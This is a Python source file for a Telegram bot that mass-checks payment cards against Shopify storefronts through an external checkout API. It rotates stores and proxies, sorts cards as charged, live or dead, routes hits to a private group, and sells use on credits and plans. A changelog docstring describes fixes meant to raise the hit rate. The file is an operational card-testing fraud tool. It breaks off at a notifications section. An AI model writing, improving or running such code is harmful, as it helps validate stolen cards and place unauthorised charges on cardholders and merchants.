"""
sh.py  v10  —  /sh single-card  +  /msh mass Shopify checker  (PTB v20+)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Base: v8 (known-working).  Targeted fixes applied on top:

FIX 1 — cb_msh_result: removed pre-emptive query.answer() at top of handler.
         Telegram allows exactly ONE answer() per callback query.  The old
         code answered immediately (blank ack) then tried to answer again for
         every alert/error branch — all those second calls threw BadRequest and
         the user saw nothing.  Each branch now answers exactly once.

FIX 2 — cb_msh_stop: removed _is_locked check.  Stop must ALWAYS work
         instantly regardless of the button-lock timer.

FIX 3 — _clean_resp used for DISPLAY ONLY.  Never called before
         classify_response — that broke RETRY pattern matching because
         "connection_error: …" was cleaned to "Connection Error" BEFORE the
         classifier looked for 'connection_error'.

FIX 4 — classify_response: added PAYMENT_AUTHORIZED, SUBSCRIPTION_CREATED,
         PAYMENT_CAPTURED, TRANSACTION_APPROVED → CHARGED;  added
         DO_NOT_HONOR, CALL_ISSUER, PICK_UP_CARD → LIVE (real card, bank
         soft-block — not a hard decline); removed those three from
         DECLINED_PATTERNS.

FIX 5 — BUTTON_LOCK_SECONDS: 30 → 5 (download buttons only).

FIX 6 — SH_SITE_RETRIES: 6 → 15;  SITE_RETRIES (mass): 6 → 12.
         'failed' kept in RETRY_PATTERNS — API returns "step N failed"
         responses that must rotate, not be classified as DEAD.
"""

from __future__ import annotations

import asyncio
import logging
import random
import re
import string
import time
from datetime import datetime
from html import escape
from io import BytesIO
from typing import Optional

import aiohttp
from telegram import Update, InputFile
from telegram.ext import (
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
)

from config import (
    get_bin_info,
    OWNER_ID,
    FORCE_CHANNELS,
    API_TIMEOUT,
    CARD_EMOJI_ID,
    USER_EMOJI_ID,
    TIME_EMOJI_ID,
    DEV_EMOJI_ID,
    PRO_EMOJI_ID,
    PROG_GATE_EMOJI_ID,
    PROG_PROGRESS_EMOJI_ID,
    PROG_LIVE_EMOJI_ID,
    PROG_DEAD_EMOJI_ID,
    PROG_ERRORS_EMOJI_ID,
    PROG_CHARGED_EMOJI_ID,
    LIVE_EMOJI_IDS,
    PLAN_EMOJIS,
    SPECIAL_FONT_MAP,
    BOT_NAME,
    RawMarkup,
    _btn,
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIG  — edit group IDs before deploying
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_CHANNEL      = "https://t.me/Batcardchk"
BOT_DISPLAY      = "Batmanchk"
DEV_LINK_HTML    = f'<a href="{BOT_CHANNEL}">{BOT_DISPLAY}</a>'
BOT_DEEP_BUY     = "https://t.me/Batchk11_bot?start=buy"
GOSHOPI_URL      = "https://goshopi.up.railway.app/shopii"
FALLBACK_SITE    = "aloracosmetics.myshopify.com"

HIT_LOG_GROUP_ID       = -1004361062205
SECRET_GROUP_ID        = -1004499920555
CHARGED_SHARE_GROUP_ID = 0               # legacy — unused

SH_COOLDOWN      = 25                    # seconds, trial users only

# ── Speed knobs — single-card /sh ─────────────────────
SH_SITE_RETRIES  = 15                    # FIX 6: was 6
SH_SITE_TIMEOUT  = 11
SH_TCP_LIMIT     = 200
SH_TCP_PER_HOST  = 80

# ── Speed knobs — mass /msh ─────────────────────────────
MAX_CONCURRENT       = 150
SITE_RETRIES         = 12               # FIX 6: was 6
SITE_TIMEOUT         = 12
TCP_LIMIT            = 600
TCP_PER_HOST         = 200
PROGRESS_INTERVAL    = 2.0
PROGRESS_EVERY_N     = 5
BUTTON_LOCK_SECONDS  = 5               # FIX 5: was 30 — download buttons only; Stop never locks

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ALL CUSTOM STICKER EMOJI IDs  — from msh.py
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
LIVE_EMOJI_ID         = "4958610528588008305"
DECLINED_EMOJI_ID     = "4956612582816351459"
HIT_GATE_EMOJI_ID     = "5341715473882955310"
HIT_RESP_EMOJI_ID     = "5839116473951328489"
GATE_EMOJI_ID         = "5801044672658805468"

PROG_GATE_EMOJI_ID    = "5341715473882955310"
PROG_PROGRESS_EMOJI_ID = "5258113901106580375"
PROG_CHARGED_EMOJI_ID = "5427168083074628963"
PROG_LIVE_EMOJI_ID    = "6267225207560214192"
PROG_DEAD_EMOJI_ID    = "4958526153955476488"
PROG_ERRORS_EMOJI_ID  = "4956611513369494230"

BTN_CHARGED_EMOJI_ID  = "5465465194056525619"
BTN_LIVE_EMOJI_ID     = "5039793437776282663"
BTN_DEAD_EMOJI_ID     = "4956612582816351459"
BTN_ALL_EMOJI_ID      = "4956324463525233747"
BTN_STOP_EMOJI_ID     = "6179444193518162239"
CARD_CHK_BTN_ID       = "5935795874251674052"
CARD_CHK_BTN_EMOJI_ID = "5935795874251674052"

CHARGED_EMOJI_IDS = [
    "5801154993188770160", "4956739572114392015", "5285221724634239278",
    "5287777298894835685", "5285024405246725814", "5287547831677112267",
    "5287658362660474522", "5285186510197381130", "5803233241963959320",
    "5462902520215002477", "5787435351521889877", "5323674506705785412",
    "5801005158959683238", "5436143465211640305", "5800688138833629633",
    "5891044423856296980", "5436068999068662274", "5427168083074628963",
]

# ── Callback data prefixes ────────────────────────────────
_CB_RESULT = "mshr"   # mshr_{sid}_{type}
_CB_STOP   = "mshs"   # mshs_{sid}

# ── Session registry ─────────────────────────────────────
MSH_SESSIONS: dict[str, dict] = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PERSISTENT SESSION  — /sh single-card (bot lifetime)
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_SH_CONNECTOR: Optional[aiohttp.TCPConnector] = None
_SH_SESSION:   Optional[aiohttp.ClientSession] = None
_SH_BIN_CACHE: dict[str, dict] = {}
_SH_BIN_LOCKS: dict[str, asyncio.Lock] = {}
_SH_BIN_META  = asyncio.Lock()

async def _get_sh_session() -> aiohttp.ClientSession:
    global _SH_CONNECTOR, _SH_SESSION
    if _SH_SESSION is None or _SH_SESSION.closed:
        _SH_CONNECTOR = aiohttp.TCPConnector(
            limit=SH_TCP_LIMIT,
            limit_per_host=SH_TCP_PER_HOST,
            keepalive_timeout=60,
            enable_cleanup_closed=True,
            ttl_dns_cache=600,
            use_dns_cache=True,
        )
        _SH_SESSION = aiohttp.ClientSession(
            connector=_SH_CONNECTOR,
            headers={"User-Agent": "Mozilla/5.0 (compatible; BatChk/10)"},
            timeout=aiohttp.ClientTimeout(total=SH_SITE_TIMEOUT + 3),
        )
    return _SH_SESSION

async def _sh_bin_cached(bin6: str) -> dict:
    if bin6 in _SH_BIN_CACHE:
        return _SH_BIN_CACHE[bin6]
    async with _SH_BIN_META:
        if bin6 not in _SH_BIN_LOCKS:
            _SH_BIN_LOCKS[bin6] = asyncio.Lock()
        lk = _SH_BIN_LOCKS[bin6]
    async with lk:
        if bin6 in _SH_BIN_CACHE:
            return _SH_BIN_CACHE[bin6]
        try:
            _SH_BIN_CACHE[bin6] = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
        except Exception:
            _SH_BIN_CACHE[bin6] = {}
        return _SH_BIN_CACHE[bin6]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE CLASSIFICATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# IMPORTANT: classify_response is ALWAYS called on the RAW _readable_resp()
# string — NEVER on the output of _clean_resp().  Cleaning before classifying
# breaks pattern matching ('connection_error' → 'Connection Error', etc.).

RETRY_PATTERNS = [
    'r4 token empty', 'r2 id empty', 'payment method is not shopify',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'del ammount empty', 'product id is empty', 'py id empty',
    'clinte token', 'hcaptcha_detected', 'receipt_empty', 'na',
    'site error! status: 429', 'site requires login', 'failed to get token',
    'no valid products', 'not shopify', 'site not supported', 'validation_custom',
    'connection error', 'connection_error', 'error processing card',
    '504', 'server error', 'client error', 'failed',
    'buyer_identity_currency',
    'token not found', 'invalid_response', 'resolve', 'curl error',
    'payments_credit_card_brand_not_supported', 'could not resolve host',
    'connect tunnel failed', 'timeout', 'proxy error',
    'step 0 failed', 'step 1 failed', 'step 2 failed', 'step 3 failed',
    'step 4 failed', 'step 5 failed', 'step 6 failed', 'step 7 failed',
    'step 8 failed', 'step 9 failed', 'step 10 failed',
    'session_error', 'delivery_no_delivery_strategy', 'delivery_zone_not_found',
    'delivery_delivery_line_detail_changed', 'no available delivery strategy',
    'delivery_strategy_conditions_not_satisfied', 'no available products found',
    'could not extract receiptid', 'receiptid missing', 'response missing receiptid',
    'inventory_failure', 'products.json', 'returned status 429',
    'returned status 500', 'returned status 502', 'returned status 503',
    'returned status 504', 'store incompatible', 'extract signedhandles',
    'missing receiptid', 'no_products', 'no_product', 'vault_failed',
    'merchandise_out_of_stock', 'connection timed out', 'connection failed',
    'api error', 'api timeout', 'connection reset', 'network error',
    'unexpected error', 'invalid json', 'json decode',
    'buyer_identity_marketing_consent',
]

# FIX 4: DO_NOT_HONOR / CALL_ISSUER / PICK_UP_CARD removed from DECLINED_PATTERNS
# — they mean the card is REAL (bank soft-block), classified as LIVE below.
DECLINED_PATTERNS = [
    'CARD_DECLINED', 'PROCESSING_ERROR', 'GENERIC_DECLINE',
    'UNKNOWN_ERROR', 'Processing Error',
    'DECISION_RULE_BLOCK', 'FRAUD_SUSPECTED',
    'INVALID_PURCHASE_TYPE', 'INVALID_PAYMENT_METHOD', 'TEST_MODE_LIVE_CARD',
    'AMOUNT_TOO_SMALL', 'INCORRECT_NUMBER', 'EXPIRED_CARD',
    'STOLEN_CARD', 'LOST_CARD', 'RESTRICTED_CARD', 'TRANSACTION_NOT_ALLOWED',
    'card_declined', 'insufficient_funds_declined',
    'lost_card', 'stolen_card', 'expired_card', 'incorrect_cvc',
    'processing_error', 'fraudulent', 'restricted_card',
    'security_violation', 'service_not_allowed', 'transaction_not_allowed',
    'try_again_later', 'withdrawal_count_limit_exceeded',
    # NOTE: do_not_honor / pickup_card are NOT here — they map to LIVE above
    # (real card, bank soft-block).  Keeping them here would be dead code and
    # would cause confusion when reading the classify_response logic.
]


def classify_response(msg: str) -> str:
    """
    Returns: CHARGED | TDS | LIVE | DEAD | RETRY

    ALWAYS call this on the RAW _readable_resp() string.
    Never pass cleaned/display text — it breaks pattern matching.
    """
    mu = msg.upper()
    ml = msg.lower()

    # ── CHARGED ──────────────────────────────────────────────────────────
    # FIX 4: added PAYMENT_AUTHORIZED, SUBSCRIPTION_CREATED, etc.
    if ("ORDER_PAID" in mu or "CHARGED" in mu or "CAPTURED" in mu
            or "PAYMENT_AUTHORIZED" in mu or "SUBSCRIPTION_CREATED" in mu
            or "PAYMENT_CAPTURED" in mu or "TRANSACTION_APPROVED" in mu):
        return "CHARGED"

    # ── 3DS ──────────────────────────────────────────────────────────────
    if "3DS_REQUIRED" in mu or "3D_SECURE" in mu or "3D SECURE" in mu:
        return "TDS"

    # ── LIVE (card real, bank soft-declined) ──────────────────────────────
    if ("INSUFFICIENT_FUNDS" in mu or "INCORRECT_CVV" in mu
            or "INCORRECT_CVC" in mu or "INCORRECT_ZIP" in mu
            or "SECURITY_CODE_INCORRECT" in mu or "SECURITY_CODE_CHECK_FAILED" in mu
            or "CVV_FAILED" in mu or "CVC_FAILED" in mu):
        return "LIVE"
    if mu.strip() == "APPROVED" or ("APPROVED" in mu and "NOT" not in mu):
        return "LIVE"
    # FIX 4: real card — bank soft-block, NOT a site/compatibility error
    if ("DO_NOT_HONOR" in mu or "DO NOT HONOR" in mu
            or "CALL_ISSUER" in mu or "PICK_UP_CARD" in mu):
        return "LIVE"

    # ── DEAD (hard decline) ───────────────────────────────────────────────
    if "GENERIC_ERROR" in mu:
        return "DEAD"
    if any(d.upper() in mu for d in DECLINED_PATTERNS):
        return "DEAD"

    # ── RETRY (site/network/delivery error) ───────────────────────────────
    if any(r.lower() in ml for r in RETRY_PATTERNS):
        return "RETRY"
    if mu.strip() in ("ERROR", "TIMEOUT", "UNKNOWN"):
        return "RETRY"

    # Unknown — treat as DEAD so retries don't loop forever
    return "DEAD"


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TINY HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _te(eid: str, fb: str = "●") -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'

def _rand_charged() -> str:
    return _te(random.choice(CHARGED_EMOJI_IDS), "💎")

def _rand_live() -> str:
    return _te(LIVE_EMOJI_ID, "✅")

def _plan_eid(plan: str) -> str:
    norm = "".join(SPECIAL_FONT_MAP.get(c, c.upper()) for c in (plan or ""))
    if norm in PLAN_EMOJIS:
        return PLAN_EMOJIS[norm]
    for k, v in PLAN_EMOJIS.items():
        if k in norm:
            return v
    return PRO_EMOJI_ID

def _user_link(user) -> str:
    name = escape(user.first_name or "User")
    if user.username:
        return f'<a href="https://t.me/{user.username}">{name}</a>'
    return f'<a href="tg://user?id={user.id}">{name}</a>'

def _fmt_time(s: float) -> str:
    s = int(s)
    return f"{s//60}m {s%60}s" if s >= 60 else f"{s}s"

def _clean_site(url: str) -> str:
    s = url.strip()
    for pfx in ("https://", "http://", "www."):
        s = s[len(pfx):] if s.startswith(pfx) else s
    return s.rstrip("/")

def _readable_resp(data: dict) -> str:
    for k in ("Response", "response", "value", "message", "category", "status", "detail", "error"):
        v = data.get(k)
        if v and str(v).strip() not in ("", "null", "None"):
            return str(v).strip()
    return str(data)[:200]

# FIX 3: _clean_resp is for DISPLAY ONLY — strip URLs and noise before showing
# to the user.  It is NEVER called before classify_response.
def _clean_resp(resp: str) -> str:
    """Strip site URLs, NO_PRODUCTS noise, and internal error details for display."""
    resp = re.sub(r'https?://\S+', '', resp)
    resp = re.sub(r'\s+at\s+\S+', '', resp)
    resp = re.sub(r'NO_PRODUCTS?:\s*[^,;\n]*', 'NO_PRODUCTS', resp, flags=re.IGNORECASE)
    resp = re.sub(r'connection_error:\s*.*', 'Connection Error', resp, flags=re.IGNORECASE)
    resp = re.sub(r'CONNECTION_ERROR:\s*.*', 'Connection Error', resp, flags=re.IGNORECASE)
    resp = resp.strip().strip(':').strip()
    return resp if resp else "Declined"

def _bin_str(bd: dict) -> str:
    if not bd or bd.get("error"):
        return "N/A"
    scheme  = str(bd.get("scheme",  "N/A")).upper()
    bank    = bd.get("bank",    "N/A")
    country = str(bd.get("country", "N/A")).upper()
    flag    = bd.get("country_emoji", "")
    return f"{scheme} - {bank} - {flag} {country}".strip(" -")

def _is_stopped(sid: str) -> bool:
    s = MSH_SESSIONS.get(sid)
    return (not s) or s.get("status") == "STOPPED"

def _is_locked(sid: str) -> bool:
    s = MSH_SESSIONS.get(sid)
    return bool(s) and (time.time() - s.get("start_time", 0)) < BUTTON_LOCK_SECONDS

def _lock_rem(sid: str) -> int:
    s = MSH_SESSIONS.get(sid)
    return max(0, int(BUTTON_LOCK_SECONDS - (time.time() - s.get("start_time", 0))) + 1) if s else 0


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FILE / PROXY LOADERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _load_sites() -> list[str]:
    try:
        with open("sites.txt") as f:
            lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        return lines or [FALLBACK_SITE]
    except FileNotFoundError:
        return [FALLBACK_SITE]

def _load_proxies() -> list[str]:
    for fname in ("proxies.txt", "px.txt"):
        try:
            with open(fname) as f:
                px = [l.strip() for l in f if l.strip() and not l.startswith("#")]
            if px:
                return px
        except FileNotFoundError:
            pass
    return []


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MASS BIN CACHE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class BinCache:
    def __init__(self):
        self._cache: dict[str, dict] = {}
        self._locks: dict[str, asyncio.Lock] = {}
        self._meta = asyncio.Lock()

    async def get(self, bin6: str) -> dict:
        if bin6 in self._cache:
            return self._cache[bin6]
        async with self._meta:
            if bin6 not in self._locks:
                self._locks[bin6] = asyncio.Lock()
            lk = self._locks[bin6]
        async with lk:
            if bin6 in self._cache:
                return self._cache[bin6]
            try:
                self._cache[bin6] = await asyncio.wait_for(get_bin_info(bin6), timeout=8) or {}
            except Exception:
                self._cache[bin6] = {}
            return self._cache[bin6]


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TELEGRAM RATE LIMITER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
class _RL:
    def __init__(self, interval: float = 1.0, burst: int = 3):
        self._interval = interval
        self._burst    = burst
        self._cnt      = 0
        self._reset    = 0.0
        self._last     = 0.0
        self._lk       = asyncio.Lock()

    async def wait(self):
        async with self._lk:
            now = time.time()
            if now - self._reset > 5.0:
                self._cnt, self._reset = 0, now
            delay = 2.0 if self._cnt >= self._burst else max(0.0, self._interval - (now - self._last))
            if delay:
                await asyncio.sleep(delay)
            self._last = time.time()
            self._cnt += 1

_rl_prog = _RL(0.4, 15)
_rl_hit  = _RL(1.0, 3)
_rl_dm   = _RL(1.0, 3)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CARD VALIDATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def luhn_check(cn: str) -> bool:
    if not cn.isdigit():
        return False
    total = 0
    for i, ch in enumerate(cn[::-1]):
        d = int(ch)
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def is_expired(mm: str, yy: str) -> bool:
    try:
        now = datetime.now()
        ey, em = int(yy), int(mm)
        if ey < now.year % 100: return True
        if ey == now.year % 100 and em < now.month: return True
        return False
    except ValueError:
        return True

def extract_cards(text: str) -> list[str]:
    patterns = [
        r'(\d{13,19})\s*\|\s*(\d{1,2})\s*\|\s*(\d{2,4})\s*\|\s*(\d{3,4})',
        r'(\d{13,19})\s*[/]\s*(\d{1,2})\s*[/]\s*(\d{2,4})\s*[/]\s*(\d{3,4})',
        r'(\d{13,19})\s*:\s*(\d{1,2})\s*:\s*(\d{2,4})\s*:\s*(\d{3,4})',
        r'(\d{13,19})\s+(\d{1,2})\s+(\d{2,4})\s+(\d{3,4})',
        r'(\d{13,19})\s*=\s*(\d{1,2})\s*=\s*(\d{2,4})\s*=\s*(\d{3,4})',
    ]
    seen, out = set(), []
    for pat in patterns:
        for m in re.findall(pat, text):
            cc, mm, yy, cvv = m
            mm = mm.zfill(2)
            if len(yy) == 4: yy = yy[2:]
            cs = f"{cc}|{mm}|{yy}|{cvv}"
            if cs not in seen:
                seen.add(cs)
                out.append(cs)
    return out


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GOSHOPI API CALL
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _call_shopii(
    session: aiohttp.ClientSession,
    card: str,
    site: str,
    proxy: str | None,
    timeout: float = SH_SITE_TIMEOUT,
) -> dict:
    params = {"cc": card, "site": site}
    if proxy:
        params["proxy"] = proxy
    try:
        async with session.get(
            GOSHOPI_URL, params=params,
            timeout=aiohttp.ClientTimeout(total=timeout),
        ) as resp:
            try:
                return await resp.json(content_type=None)
            except Exception:
                raw = await resp.text()
                return {"Response": raw[:300]}
    except asyncio.TimeoutError:
        return {"Response": "timeout"}
    except asyncio.CancelledError:
        raise
    except Exception as e:
        return {"Response": f"connection_error: {str(e)[:80]}"}


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# MULTI-SITE RETRY CORE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
async def _check_card_with_retry(
    session: aiohttp.ClientSession,
    card: str,
    sites: list[str],
    proxies: list[str],
    max_sites: int = SITE_RETRIES,
    site_timeout: float = SITE_TIMEOUT,
) -> tuple[str, str, str, str]:
    """
    Returns (verdict, display_resp, price, currency).

    FIX 3 applied here:
      • classify_response() is called on the RAW _readable_resp() string.
      • _clean_resp() is called AFTER classification, on the display string only.
      • This ensures 'connection_error: ...', 'step N failed', etc. are still
        matched by RETRY_PATTERNS and cause site rotation, not DEAD verdicts.
    """
    if not sites:
        sites = [FALLBACK_SITE]

    site_pool  = sites.copy()
    random.shuffle(site_pool)
    proxy_pool = proxies.copy() if proxies else []
    if proxy_pool:
        random.shuffle(proxy_pool)

    tried: set[str] = set()
    price, currency = "0.00", "USD"
    last_raw  = "All sites exhausted"
    last_disp = "All sites exhausted"

    for attempt in range(max_sites):
        if asyncio.current_task() and asyncio.current_task().cancelled():
            raise asyncio.CancelledError()

        untried = [s for s in site_pool if s not in tried]
        if not untried:
            tried.clear()
            untried = site_pool[:]
        site = untried[0]
        tried.add(site)

        proxy = proxy_pool[attempt % len(proxy_pool)] if proxy_pool else None

        try:
            data = await _call_shopii(session, card, _clean_site(site), proxy, timeout=site_timeout)
        except asyncio.CancelledError:
            raise
        except Exception:
            continue

        # ── FIX 3: classify on RAW, clean for display only ─────────────
        raw_resp  = _readable_resp(data)
        disp_resp = _clean_resp(raw_resp)         # display only
        verdict   = classify_response(raw_resp)   # classify on raw!

        price    = str(data.get("Price",    data.get("price",    "0.00"))).strip()
        currency = str(data.get("Currency", data.get("currency", "USD"))).strip()

        last_raw  = raw_resp
        last_disp = disp_resp

        if verdict in ("CHARGED", "LIVE", "TDS", "DEAD"):
            return verdict, disp_resp, price, currency
        # RETRY → silently continue to next site+proxy

    # Exhausted all attempts — card is dead or all sites busy
    return "DEAD", last_disp, price, currency


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# UI BUILDERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _status_line(verdict: str, price: str = "", currency: str = "") -> tuple[str, str]:
    ch_link = f'<a href="{BOT_CHANNEL}">[❆]</a>'
    price_s = f" | {escape(price)} {escape(currency)}" if price and price not in ("0.00", "") else ""
    if verdict == "CHARGED":
        return (f'<b>{ch_link} Charged {_rand_charged()}</b>',
                f'<b>Gate ➳ Shopify{price_s}</b>')
    if verdict == "TDS":
        return (f'<b>{ch_link} Live {_rand_live()} [3DS]</b>',
                '<b>Gate ➳ Shopify 0-20$</b>')
    if verdict == "LIVE":
        return (f'<b>{ch_link} Live {_rand_live()}</b>',
                '<b>Gate ➳ Shopify 0-20$</b>')
    if verdict == "DEAD":
        return (f'<b>{ch_link} Dead {_te(DECLINED_EMOJI_ID,"❌")}</b>',
                '<b>Gate ➳ Shopify 0-20$</b>')
    return (f'<b>{ch_link} Error {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}</b>',
            '<b>Gate ➳ Shopify 0-20$</b>')

def _build_result(card, resp, verdict, bin_txt, price, currency, elapsed, user, plan) -> str:
    sl, gl = _status_line(verdict, price, currency)
    # resp is already the cleaned display string from _check_card_with_retry
    return (
        f'{sl}\n\n'
        f'<b>{_te(CARD_EMOJI_ID,"💳")}</b>\n'
        f'<b>   ⤷ <code>{escape(card)}</code></b>\n'
        f'{gl}\n'
        f'<b>──────────</b>\n'
        f'<b>Resp ➳ {escape(resp)}</b>\n'
        f'<b>Bin  ➳ <code>{escape(bin_txt)}</code></b>\n'
        f'<b>──────────</b>\n'
        f'<b>{_te(TIME_EMOJI_ID,"⏱")} ➳ {_fmt_time(elapsed)}</b>\n'
        f'<b>{_te(USER_EMOJI_ID,"👤")} ➳ {_user_link(user)} {_te(_plan_eid(plan),"⭐")}</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )

def _guard(header: str, body: str) -> str:
    ch_link = f'<a href="{BOT_CHANNEL}">[❆]</a>'
    return (
        f'<b>{ch_link} {header}</b>\n\n'
        f'{body}\n'
        f'<b>──────────</b>\n'
        f'<b>{_te(DEV_EMOJI_ID,"⚡")} ➳ {DEV_LINK_HTML} {_te(PRO_EMOJI_ID,"⭐")}</b>'
    )

def _maintenance_msg():  return _guard(f'Maintenance {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}', '<b>Bot is under maintenance.</b>')
def _gate_off_msg():     return _guard(f'Gate Off {_te(PROG_DEAD_EMOJI_ID,"❌")}',        '<b>Shopify gate is currently OFF.</b>')
def _no_credits_msg():   return _guard(f'No Credits {_te(PROG_DEAD_EMOJI_ID,"❌")}',     '<b>0 credits — use /sub or /key.</b>')
def _cooldown_msg(r):    return _guard(f'Cooldown {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',    f'<b>Wait <code>{r:.1f}s</code>. Premium = zero cooldown.</b>')
def _join_msg():         return _guard(f'Join Required {_te(PROG_GATE_EMOJI_ID,"🔒")}',  '<b>Join channels below to use the bot:</b>')
def _usage_sh_msg():     return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',       '<b>Command:</b> <code>/sh cc|mm|yy|cvv</code>\n<b>Example:</b>\n<code>/sh 4111111111111111|12|26|123</code>')
def _usage_msh_msg():    return _guard(f'Usage {_te(PROG_ERRORS_EMOJI_ID,"⚠️")}',       '<b>Command:</b> <code>/msh</code> (attach .txt or paste cards)\n<b>Format:</b> <code>cc|mm|yy|cvv</code>')


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# KEYBOARDS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
_bot_btn = lambda: _btn("𝘾𝘼𝙍𝘿 ✘ 𝘾𝙃𝙆", url=BOT_CHANNEL, style="primary", icon=CARD_CHK_BTN_ID)

def _kb_verdict(verdict: str) -> RawMarkup:
    if verdict == "CHARGED":
        return RawMarkup([[_btn("CHARGED", url=BOT_CHANNEL, style="success", icon=BTN_CHARGED_EMOJI_ID), _bot_btn()]])
    if verdict in ("LIVE", "TDS"):
        return RawMarkup([[_btn("LIVE", url=BOT_CHANNEL, style="success", icon=BTN_LIVE_EMOJI_ID), _bot_btn()]])
    if verdict == "DEAD":
        return RawMarkup([[_btn("DEAD", url=BOT_CHANNEL, style="danger", icon=BTN_DEAD_EMOJI_ID), _bot_btn()]])
    return RawMarkup([[_btn("ERROR", url=BOT_CHANNEL, style="secondary", icon=PROG_ERRORS_EMOJI_ID), _bot_btn()]])

def _msh_buttons(sid: str, running: bool = True) -> RawMarkup:
    s   = MSH_SESSIONS.get(sid, {})
    chg = s.get("charged", 0)
    lv  = s.get("live", 0)
    dd  = s.get("dead", 0)
    chk = s.get("checked", 0)
    rows = [
        [
            _btn(f"Charged ({chg})", cb=f"{_CB_RESULT}_{sid}_charged", style="success", icon=BTN_CHARGED_EMOJI_ID),
            _btn(f"Live ({lv})",     cb=f"{_CB_RESULT}_{sid}_live",    style="success", icon=BTN_LIVE_EMOJI_ID),
        ],
        [
            _btn(f"Dead ({dd})",     cb=f"{_CB_RESULT}_{sid}_dead",    style="danger",  icon=BTN_DEAD_EMOJI_ID),
            _btn(f"All ({chk})",     cb=f"{_CB_RESULT}_{sid}_all",     style="primary", icon=BTN_ALL_EMOJI_ID),
        ],
    ]
    if running:
        rows.append([_btn("⏹ Stop", cb=f"{_CB_STOP}_{sid}", style="danger", icon=BTN_STOP_EMOJI_ID)])
    return RawMarkup(rows)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# USER DATA HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
def _get_ud(uid: int, context) -> dict:
    ud = context.bot_data.setdefault("user_data", {})
    k  = str(uid)
    if k not in ud:
        ud[k] = {"name": "User", "credits": 150, "plan": "TRIAL", "expires": 0, "pre_premium_credits": 0}
    return ud[k]

def _is_premium(ud: dict, uid: int = 0) -> bool:
    if uid and uid == OWNER_ID:
        ud["plan"] = "ROOT"; return True
    if ud.get("plan", "TRIAL").upper() == "TRIAL": return False
    if ud.get("expires", 0) <= time.time():
        ud["plan"]    = "TRIAL"
        ud["credits"] = ud.get("pre_premium_credits", 150)
        ud["expires"] = 0
        return False
    return True

async def _check_force_sub(uid: int, context) -> list:
    if uid == OWNER_ID: return []
    nj = []
    for name, link in FORCE_CHANNELS:
        try:
            m = await context.bot.get_chat_member(f"@{name}", uid)
            if m.status in ("left", "kicked", "restricted"):
                nj.append((name, link))
        except Exception:
            pass
    return nj


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HIT NOTIFICATIONS
